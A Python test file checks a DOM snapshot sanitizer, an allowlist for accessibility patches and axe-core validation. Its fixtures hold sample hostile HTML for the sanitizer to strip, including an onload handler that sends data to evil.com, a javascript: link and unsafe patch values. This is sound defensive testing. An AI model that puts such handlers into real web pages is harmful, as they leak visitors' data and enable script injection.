"""Unit and integration tests for DOM snapshot sanitization, patch containment, and axe-core validation."""

import pytest

from app.core.errors import PolicyViolationError
from app.services.snapshot_service import (
    apply_dom_patch,
    compute_patch_hash,
    compute_snapshot_hash,
    sanitize_dom_snapshot,
)
from app.services.snapshot_validator import SnapshotValidator


def test_sanitize_dom_snapshot_purges_scripts_and_events() -> None:
    """Verify HTML sanitizer eliminates scripts, stylesheet links, tracking beacons, and event handlers."""
    dirty_html = """
    <!DOCTYPE html>
    <html>
      <head>
        <title>Test Page</title>
        <script src="https://tracker.com/beacon.js"></script>
        <script>console.log("internal script");</script>
        <link rel="stylesheet" href="https://cdn.example.com/styles.css">
        <link rel="dns-prefetch" href="//evil.com">
      </head>
      <body>
        <h1 onclick="alert('click')">Header</h1>
        <img src="logo.png" onload="fetch('https://evil.com/leak')" class="logo">
        <a href="javascript:exploit()" onmouseover="hover()">Malicious link</a>
        <iframe src="https://ad.com"></iframe>
      </body>
    </html>
    """

    sanitized = sanitize_dom_snapshot(dirty_html)

    assert "<script" not in sanitized.lower()
    assert "https://tracker.com" not in sanitized
    assert "console.log" not in sanitized
    assert "stylesheet" not in sanitized.lower()
    assert "<iframe" not in sanitized.lower()
    assert "onclick" not in sanitized.lower()
    assert "onload" not in sanitized.lower()
    assert "onmouseover" not in sanitized.lower()
    assert "javascript:" not in sanitized.lower()
    assert "<h1" in sanitized
    assert "Header" in sanitized


def test_apply_dom_patch_allowlisted_operations() -> None:
    """Verify safe allowlisted DOM patch operations apply cleanly."""
    html = '<div class="banner"><img src="hero.jpg" class="hero"><button class="btn">Click</button></div>'

    operations = [
        {
            "operation": "set_attribute",
            "selector": "img.hero",
            "attribute": "alt",
            "value": "Hero presentation banner",
        },
        {
            "operation": "set_attribute",
            "selector": "button.btn",
            "attribute": "aria-label",
            "value": "Submit form",
        },
        {"operation": "replace_text", "selector": "button.btn", "value": "Submit Action"},
    ]

    patched, logs = apply_dom_patch(html, operations)

    assert 'alt="Hero presentation banner"' in patched
    assert 'aria-label="Submit form"' in patched
    assert "Submit Action" in patched
    assert len(logs) == 3
    assert all(log["status"] == "applied" for log in logs)


def test_apply_dom_patch_rejects_unsafe_attributes() -> None:
    """Verify patch application rejects event handlers and unallowlisted attributes with PolicyViolationError."""
    html = '<div class="banner"><img src="hero.jpg" class="hero"></div>'

    # 1. Prohibited event handler attribute
    with pytest.raises(PolicyViolationError) as exc_info:
        apply_dom_patch(
            html,
            [
                {
                    "operation": "set_attribute",
                    "selector": "img.hero",
                    "attribute": "onload",
                    "value": "steal()",
                }
            ],
        )
    assert "violates safe accessibility patch policy" in str(exc_info.value) or "prohibited" in str(
        exc_info.value
    )

    # 2. Arbitrary non-allowlisted attribute
    with pytest.raises(PolicyViolationError):
        apply_dom_patch(
            html,
            [
                {
                    "operation": "set_attribute",
                    "selector": "img.hero",
                    "attribute": "data-unsafe-attr",
                    "value": "xyz",
                }
            ],
        )

    # 3. Script URI scheme in value
    with pytest.raises(PolicyViolationError):
        apply_dom_patch(
            html,
            [
                {
                    "operation": "set_attribute",
                    "selector": "img.hero",
                    "attribute": "title",
                    "value": "javascript:alert(1)",
                }
            ],
        )


def test_compute_hashes_deterministic() -> None:
    """Verify snapshot and patch hash helpers produce deterministic SHA-256 strings."""
    html = '<img src="test.png">'
    ops = [{"operation": "set_attribute", "selector": "img", "attribute": "alt", "value": "Test"}]

    hash1 = compute_snapshot_hash(html)
    hash2 = compute_snapshot_hash(html)
    assert hash1 == hash2
    assert len(hash1) == 64

    patch_hash1 = compute_patch_hash(ops)
    patch_hash2 = compute_patch_hash(ops)
    assert patch_hash1 == patch_hash2
    assert len(patch_hash1) == 64


@pytest.mark.asyncio
async def test_isolated_snapshot_validation_with_axe_core() -> None:
    """Verify isolated snapshot validator applies patch and passes axe-core validation."""
    validator = SnapshotValidator()

    # Initial snippet lacking alt attribute (fails image-alt in axe-core)
    snapshot_snippet = '<img src="logo.png" class="brand-logo">'
    original_rule = "image-alt"

    # Remediation patch setting proper accessible alt text
    patch = [
        {
            "operation": "set_attribute",
            "selector": "img.brand-logo",
            "attribute": "alt",
            "value": "AccessGuard Company Logo",
        }
    ]

    result = await validator.validate_snapshot(
        snapshot_html=snapshot_snippet,
        original_rule_id=original_rule,
        patch_operations=patch,
    )

    assert result["validation_mode"] == "dom_snapshot"
    assert result["passed"] is True
    assert result["original_rule_resolved"] is True
    assert len(result["new_violations"]) == 0
    assert "Snapshot validation passed" in result["details"]["label"]
    assert result["details"]["applied_operations_count"] == 1
    assert "axe_version" in result["details"]


@pytest.mark.asyncio
async def test_snapshot_validation_fails_when_rule_not_resolved() -> None:
    """Verify validator marks failure when patch does not resolve the original axe violation."""
    validator = SnapshotValidator()

    snapshot_snippet = '<img src="logo.png" class="brand-logo">'
    original_rule = "image-alt"

    # Ineffective patch targeting wrong selector
    ineffective_patch = [
        {
            "operation": "set_attribute",
            "selector": "img.wrong-class",
            "attribute": "alt",
            "value": "Missing element alt",
        }
    ]

    result = await validator.validate_snapshot(
        snapshot_html=snapshot_snippet,
        original_rule_id=original_rule,
        patch_operations=ineffective_patch,
    )

    assert result["passed"] is False
    assert result["original_rule_resolved"] is False
    assert "Snapshot validation failed" in result["details"]["label"]
